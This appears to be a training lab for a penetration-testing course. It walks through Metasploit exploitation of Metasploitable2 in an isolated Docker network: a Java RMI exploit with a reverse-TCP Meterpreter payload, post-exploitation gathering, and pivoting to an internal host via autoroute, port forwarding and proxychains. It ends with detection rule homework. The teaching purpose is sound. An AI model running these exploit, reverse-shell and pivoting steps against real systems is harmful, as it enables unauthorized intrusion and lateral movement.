# Lab 06 — Metasploit Practice

**Module**: 05 — Metasploit Fundamentals  
**Lessons**: All four (msf-fundamentals, msf-rc-workflow, msfvenom-payloads, msf-post-exploit)  
**Isolation**: fully internal — two networks (extnet + intnet)  
**Time**: 120-180 minutes

## What you'll practice

The full Metasploit chain end-to-end:

1. Workspace setup + scan import via `msf-session.sh`
2. CVE → RC generation via `msf-rc-gen.sh`
3. Auxiliary scanners → confirm vulnerability
4. Payload generation via `msfvenom-gen.sh`
5. Handler launch + exploit → session
6. Post-exploit recipes via `msf-post.sh`
7. Pivot to an internal-only target

## Network layout

```text
       ┌───────────────────────┐
       │   attacker (toolkit)  │ 10.66.0.10
       └───────────┬───────────┘
                   │  extnet (reachable)
       ┌───────────▼───────────┐
       │      vuln-target      │ 10.66.0.20 / 192.168.50.20
       │   (Metasploitable2)   │
       └───────────┬───────────┘
                   │  intnet (NOT reachable from attacker)
       ┌───────────▼───────────┐
       │   internal-target     │ 192.168.50.30
       │   (DVWA — pivot prac.)│
       └───────────────────────┘
```

Key constraint: `internal-target` is **only** reachable from `vuln-target`.
The attacker cannot route directly to 192.168.50.30 — you have to compromise
`vuln-target` first, then pivot.

## Setup

```bash
docker compose up -d

# Confirm
docker compose ps
# Should show 3 healthy containers

# Open a shell inside the attacker
docker exec -it penlearn-msf-attacker bash
```

Inside the attacker:

```bash
# Scaffold the engagement
./scripts/engagement-init.sh msf-practice --type infra

cd /engagements/msf-practice

# Confirm msf and DB are healthy
./scripts/msf-session.sh db-status --execute
```

If `db-status` shows the DB not running, run `msfdb init` and `msfdb start`
once at the toolkit's first boot.

## Exercises

### Exercise 1 — Workspace + scan import

```bash
./scripts/msf-session.sh workspace --name msf-practice --execute

# Recon
./scripts/pentest.sh target.lab.local 10.66.0.20

# Import to msf workspace
./scripts/msf-session.sh import-nmap \
  --xml /engagements/msf-practice/02-active-recon/*.xml \
  --workspace msf-practice \
  --execute

# Inside msfconsole — confirm
msfconsole -q -x "workspace msf-practice; hosts; services; exit"
```

You should see 10.66.0.20 in `hosts` and ~25 services in `services` (Metasploitable2
runs a lot of vulnerable services).

### Exercise 2 — From findings to RC

```bash
./scripts/cve-lookup.sh --nmap-file /engagements/msf-practice/02-active-recon/*.txt \
  --output /engagements/msf-practice/findings.json \
  --engagement msf-practice

python3 scripts/risk-scoring.py \
  --findings /engagements/msf-practice/findings.json \
  --output /engagements/msf-practice/scored.json

./scripts/msf-rc-gen.sh \
  --findings /engagements/msf-practice/scored.json \
  --target 10.66.0.20 \
  --lhost 10.66.0.10 \
  --engagement msf-practice
```

Read the generated RC under
`/engagements/msf-practice/05-exploitation/msf/`. You should see auxiliary
scanners for several Metasploitable2 vulnerabilities (vsftpd backdoor, Samba,
distccd, etc.). Run the aux section first:

```bash
msfconsole -q -r /engagements/msf-practice/05-exploitation/msf/auxiliary-*.rc
```

### Exercise 3 — Pick an exploit, generate a payload, catch a session

vsftpd 2.3.4 is the cleanest practice exploit on Metasploitable2:

```bash
./scripts/msfvenom-gen.sh --recipe lin-meterp-elf \
  --lhost 10.66.0.10 --lport 4444 \
  --engagement msf-practice \
  --execute
```

But for vsftpd 2.3.4 specifically you don't even need a custom payload — the
backdoor lands you a cmd shell. We'll use a different exploit to practice the
full chain. Try Java RMI on port 1099 (it lets you pick your payload):

```bash
# Launch handler in another terminal
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD java/meterpreter/reverse_tcp; \
  set LHOST 10.66.0.10; set LPORT 4444; \
  set ExitOnSession false; exploit -j"

# Run the exploit in msfconsole
msfconsole -q -x "use exploit/multi/misc/java_rmi_server; \
  set RHOSTS 10.66.0.20; set PAYLOAD java/meterpreter/reverse_tcp; \
  set LHOST 10.66.0.10; set LPORT 4444; \
  run"
```

You should see `Meterpreter session 1 opened`. Background it (`background`),
then `sessions -l`.

### Exercise 4 — Post-exploit recipes

```bash
./scripts/msf-post.sh --recipe sysinfo --session 1 --execute
./scripts/msf-post.sh --recipe gather-linux --session 1 \
  --engagement msf-practice --execute
./scripts/msf-post.sh --recipe local-privesc-suggest --session 1 --execute
```

Read the output. The local_exploit_suggester output is the planning input for
the next step.

### Exercise 5 — Pivot to the internal target

The internal-target (192.168.50.30) is unreachable from the attacker directly.
Confirm:

```bash
curl --max-time 3 http://192.168.50.30/  # times out
```

Now pivot:

```bash
./scripts/msf-post.sh --recipe pivot-route --session 1 --execute
```

This adds `autoroute -s 192.168.50.0/24` through session 1. Inside msfconsole:

```text
sessions -i 1
run autoroute -s 192.168.50.0/24
background
route print
# Should show 192.168.50.0/24 → session 1

# Now scan the internal subnet through msf
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.50.0/24
set PORTS 80,443,3306
run
```

Internal-target should show up. Then:

```bash
./scripts/msf-post.sh --recipe pivot-portfwd --session 1 --execute
```

Inside msfconsole:

```text
sessions -i 1
portfwd add -l 8080 -p 80 -r 192.168.50.30
```

Back on the attacker:

```bash
curl http://127.0.0.1:8080/   # now reaches DVWA through the pivot
```

### Exercise 6 — SOCKS proxy

```bash
./scripts/msf-post.sh --recipe pivot-socks --session 1 --execute
```

Then use proxychains:

```bash
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -Pn -p 80,443,3306 192.168.50.30
proxychains curl http://192.168.50.30/
```

### Exercise 7 — Export evidence

Before tearing down:

```bash
./scripts/msf-session.sh db-export \
  --workspace msf-practice \
  --engagement msf-practice \
  --execute
```

The XML dump goes into your engagement workspace as the durable artifact.

## Success criteria

- [ ] msf workspace `msf-practice` created and populated with hosts + services
- [ ] One aux scanner confirmed at least one vulnerability
- [ ] One exploit ran and produced a session
- [ ] `gather-linux` recipe output saved to engagement workspace
- [ ] Pivot route added; internal-target visible from msfconsole's scanner
- [ ] portfwd reaches internal-target via `localhost:8080`
- [ ] SOCKS proxy works via proxychains
- [ ] DB exported to engagement workspace

## Detection homework

For each technique you exercised, generate the matching Sigma rule:

```bash
./scripts/sigma-rule-builder.sh --technique T1190 --incident-id msf-practice  # initial exploit
./scripts/sigma-rule-builder.sh --technique T1059 --incident-id msf-practice  # meterpreter exec
./scripts/sigma-rule-builder.sh --technique T1083 --incident-id msf-practice  # file/dir discovery
./scripts/sigma-rule-builder.sh --technique T1090 --incident-id msf-practice  # SOCKS proxy / pivot
./scripts/sigma-rule-builder.sh --technique T1572 --incident-id msf-practice  # protocol tunneling
```

Read each rule. Note what telemetry your activity would have produced. This
calibrates what real-world detection looks like.

## Tear down

```bash
exit
docker compose down -v
```

## Limitations / notes

- Metasploitable2 (1404-era Ubuntu) doesn't reflect modern target reality.
  It's useful for learning *the chain*, not for learning what real targets
  look like. For modern targets, use Metasploitable3 (heavier — Vagrant only)
  or a Windows lab via the AD lab (Module 06).
- Stage 2 callbacks across docker networks sometimes need an explicit
  `EnableStageEncoding false` if the docker bridge MTU is misconfigured.
  Symptoms: handler shows "Sending stage" but no session catches.
- The toolkit container needs network privileges for some msf operations.
  If `db_nmap` fails with permission errors, run the toolkit container with
  `--cap-add=NET_RAW --cap-add=NET_ADMIN`.
